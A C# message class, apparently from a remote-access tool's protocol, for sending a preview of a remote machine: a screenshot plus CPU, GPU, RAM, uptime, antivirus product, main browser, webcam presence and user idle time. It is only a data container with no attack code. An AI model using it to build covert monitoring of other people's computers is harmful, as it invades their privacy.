using MessagePack;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Video;

namespace Pulsar.Common.Messages.Preview
{
    [MessagePackObject]
    public class GetPreviewResponse : IMessage
    {
        [Key(1)]
        public byte[] Image { get; set; }

        [Key(2)]
        public int Quality { get; set; }

        [Key(3)]
        public int Monitor { get; set; }

        [Key(4)]
        public Resolution Resolution { get; set; }

        [Key(5)]
        public string CPU { get; set; }

        [Key(6)]
        public string GPU { get; set; }

        [Key(7)]
        public string RAM { get; set; }

        [Key(8)]
        public string Uptime { get; set; }

        [Key(9)]
        public string AV { get; set; }

        [Key(10)]
        public string MainBrowser { get; set; }

        [Key(11)]
        public bool HasWebcam { get; set; }

        [Key(12)]
        public string AFKTime { get; set; }
    }
}
